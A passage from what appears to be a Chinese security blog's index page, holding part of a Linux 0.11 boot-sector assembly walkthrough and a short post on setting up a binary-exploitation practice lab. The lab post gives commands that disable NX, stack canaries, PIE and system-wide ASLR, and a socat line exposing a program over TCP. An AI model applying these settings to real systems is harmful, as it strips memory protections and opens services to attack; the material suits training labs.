cx,#9</span><br><span class="line">	add bx,cx</span><br><span class="line">	jnc rp_read</span><br><span class="line">	mov ax,es</span><br><span class="line">	add ax,#0x1000</span><br><span class="line">	mov es,ax</span><br><span class="line">	xor bx,bx</span><br><span class="line">	jmp rp_read</span><br><span class="line"></span><br><span class="line">read_track:</span><br><span class="line">	push ax</span><br><span class="line">	push bx</span><br><span class="line">	push cx</span><br><span class="line">	push dx</span><br><span class="line">	mov dx,track</span><br><span class="line">	mov cx,sread</span><br><span class="line">	inc cx</span><br><span class="line">	mov ch,dl</span><br><span class="line">	mov dx,head</span><br><span class="line">	mov dh,dl</span><br><span class="line">	mov dl,#0</span><br><span class="line">	and dx,#0x0100</span><br><span class="line">	mov ah,#2</span><br><span class="line">	int 0x13</span><br><span class="line">	jc bad_rt</span><br><span class="line">	pop dx</span><br><span class="line">	pop cx</span><br><span class="line">	pop bx</span><br><span class="line">	pop ax</span><br><span class="line">	ret</span><br><span class="line">bad_rt:	mov ax,#0</span><br><span class="line">	mov dx,#0</span><br><span class="line">	int 0x13</span><br><span class="line">	pop dx</span><br><span class="line">	pop cx</span><br><span class="line">	pop bx</span><br><span class="line">	pop ax</span><br><span class="line">	jmp read_track</span><br></pre></td></tr></table></figure><p>接下来看<code>kill_motor</code>子模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kill_motor:</span><br><span class="line">	push dx</span><br><span class="line">	mov dx,#0x3f2</span><br><span class="line">	mov al,#0</span><br><span class="line">	outb</span><br><span class="line">	pop dx</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure><h2 id="0x04-确认下根设备号"><a href="#0x04-确认下根设备号" class="headerlink" title="0x04 确认下根设备号"></a>0x04 确认下根设备号</h2><h2 id="0x05-将程序控制权转交给setup-s"><a href="#0x05-将程序控制权转交给setup-s" class="headerlink" title="0x05 将程序控制权转交给setup.s"></a>0x05 将程序控制权转交给setup.s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SETUPSEG = 0x9020</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">! after that (everyting loaded), we jump to</span><br><span class="line">! the setup-routine loaded directly after</span><br><span class="line">! the bootblock:</span><br><span class="line"></span><br><span class="line">	jmpi	0,SETUPSEG</span><br></pre></td></tr></table></figure><p>前面说到0x13中断将第二个扇区到第五个扇区的内容(即setup.s的内容)加载到以0x90200处地址，现在跳转到那边，把控制权交给他</p></div><footer class="article-footer"><a data-url="https://www.daikersec.com/post/b309a0f3.html" data-id="cjh7qn8ig0009vdxvhxjvnr3e" class="article-share-link" data-share="baidu" data-title="Linuxv0.11源码分析之引导启动程序一">分享到</a><ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul></footer></div></article><article id="post-PWN环境搭建" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/post/11af4bf6.html" class="article-date"><time datetime="2018-03-18T07:02:16.000Z" itemprop="datePublished">2018-03-18</time></a><div class="article-category"><a class="article-category-link" href="/categories/pwn/">pwn</a></div></div><div class="article-inner"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/post/11af4bf6.html">PWN环境搭建</a></h1></header><div class="article-entry" itemprop="articleBody"><h2 id="0x00-关闭安全机制"><a href="#0x00-关闭安全机制" class="headerlink" title="0x00 关闭安全机制"></a>0x00 关闭安全机制</h2><p>1.关掉DEP/NX（堆栈不可执行）<br></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  -z execstack -o pwnme pwnme.c</span><br></pre></td></tr></table></figure><p></p><p>2.关掉Stack Protector/Canary（栈保护）<br></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure><p></p><p>3.关掉程序ASLR/PIE（程序随机化保护）<br></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -o pwnme pwnme.c</span><br></pre></td></tr></table></figure><p></p><p>4.关闭整个linux系统的ASLR保护<br></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su - </span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p></p><p>5.打开整个linux系统的ASLR保护<br></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su -</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p></p><ol><li>64位linux下面的GCC编译出一个32位可执行程序 加参数<code>- m32</code><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z execstack -fno-stack-protector -o pwnme pwnme.c</span><br></pre></td></tr></table></figure></li></ol><p>另外说明下在ubuntu上如果要用 -m32 参数就要安装如下的库：<br></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install build-essential module-assistant  </span><br><span class="line">$ sudo apt-get install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure><p></p><h2 id="0x01-安装pwntools"><a href="#0x01-安装pwntools" class="headerlink" title="0x01 安装pwntools"></a>0x01 安装pwntools</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><h2 id="0x02-安装peda"><a href="#0x02-安装peda" class="headerlink" title="0x02 安装peda"></a>0x02 安装peda</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h2 id="0x03-绑定端口"><a href="#0x03-绑定端口" class="headerlink" title="0x03 绑定端口"></a>0x03 绑定端口</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:端口号，reuseaddr，fork <span class="built_in">exec</span>:程序位置</span><br></pre></td></tr></table></figure></div><footer class="article-footer"><a data-url="https://www.daikersec.com/post/11af4bf6.html" data-id="cjh7qn8ik000bvdxvmmi19z4p" class="article-share-link" data-share="baidu" data-title="PWN环境搭建">分享到</a><ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul></footer></div></article><nav id="page-nav"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a></nav></section><aside id="sidebar"><div class="widget-wrap"><h3 class="widget-title">分类</h3><div class="widget"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/数据分析/">数据分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/注入/">注入</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a><span class="category-list-count">1</span></li></ul></div></div><div class="widget-wrap"><h3 class="widget-title">标签</h3><div class="widget"><ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackinglab/">hackinglab</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/">tools</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/取证/">取证</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/提权/">提权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据分析/">数据分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日志分析/">日志分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/注入/">注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流量分析/">流量分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透/">渗透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞研究/">漏洞研究</a><span class="tag-list-count">2</span></li></ul></div></div><div class="widget-wrap"><h3 class="widget-title">标签云</h3><div class="widget tagcloud"><a href="/tags/CTF/" style="font-size:10px">CTF</a> <a href="/tags/Kali/" style="font-size:10px">Kali</a> <a href="/tags/Linux/" style="font-size:13.33px">Linux</a> <a href="/tags/Web/" style="font-size:20px">Web</a> <a href="/tags/ctf/" style="font-size:16.67px">ctf</a> <a href="/tags/hackinglab/" style="font-size:13.33px">hackinglab</a> <a href="/tags/php/" style="font-size:10px">php</a> <a href="/tags/pwn/" style="font-size:10px">pwn</a> <a href="/tags/tools/" style="font-size:10px">tools</a> <a href="/tags/web/" style="font-size:10px">web</a> <a href="/tags/wireshark/" style="font-size:13.33px">wireshark</a> <a href="/tags/代码审计/" style="font-size:10px">代码审计</a> <a href="/tags/取证/" style="font-size:13.33px">取证</a> <a href="/tags/提权/" style="font-size:10px">提权</a> <a href="/tags/数据分析/" style="font-size:13.33px">数据分析</a> <a href="/tags/日志分析/" style="font-size:13.33px">日志分析</a> <a href="/tags/注入/" style="font-size:13.33px">注入</a> <a href="/tags/流量分析/" style="font-size:13.33px">流量分析</a> <a href="/tags/渗透/" style="font-size:10px">渗透</a> <a href="/tags/漏洞研究/" style="font-size:13.33px">漏洞研究</a></div></div><div class="widget-wrap"><h3 class="widget-title">归档</h3><div class="widget"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a><span class="archive-list-count">3</span></li></ul></div></div><div class="widget-wrap"><h3 class="widget-title">近期文章</h3><div class="widget"><ul><li><a href="/post/ba9a968.html">铁人三项2018第七赛区(福建)数据赛wp</a></li><li><a href="/post/3c7f43ba.html">铁人三项数据赛样题分析</a></li><li><a href="/post/9668f403.html">metasploit在后渗透中的作用</a></li><li><a href="/post/b309a0f3.html">Linuxv0.11源码分析之引导启动程序一</a></li><li><a href="/post/11af4bf6.html">PWN环境搭建</a></li></ul></div></div><div class="widget-wrap"><h3 class="widget-title">友情链接</h3><div class="widget"><ul><li><a href="http://www.iFurySt.com" target="_blank">iFurySt</a></li></ul></div></div></aside></div><footer id="footer"><div class="outer"><div id="footer-info" class="inner">&copy; 2018 daiker<br>由 <a href="https://daikersec.com" target="_blank">daiker</a> 强力支持 <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人次</span></div></div></footer></div><nav id="mobile-nav"><a href="/" class="mobile-nav-link">Home</a> <a href="/archives" class="mobile-nav-link">Archives</a></nav><div id="totop"><a title="返回顶部"><img src="/img/scrollup.png"></a></div><div id="article-share-box" class="article-share-box"><div id="bdshare" class="bdsharebuttonbox article-share-links"><a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a> <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a> <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a> <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a> <a class="article-share-more" data-cmd="more" title="更多"></a></div></div><script>function SetShareData(e,a){return shareDataTitle&&shareDataUrl&&(a.bdText=shareDataTitle,a.bdUrl=shareDataUrl),a}with(window._bd_share_config={common:{onBeforeClick:SetShareData},share:{bdCustomStyle:"/css/bdshare.css"}},document)(getElementsByTagName("head")[0]||body).appendChild(createElement("script")).src="//bdimg.share.baidu.com/static/api/js/share.js?cdnversion="+~(-new Date/36e5)</script><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script><link rel="stylesheet" href="/fancybox/jquery.fancybox.css"><script src="/fancybox/jquery.fancybox.pack.js"></script><script src="/js/script.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script></body>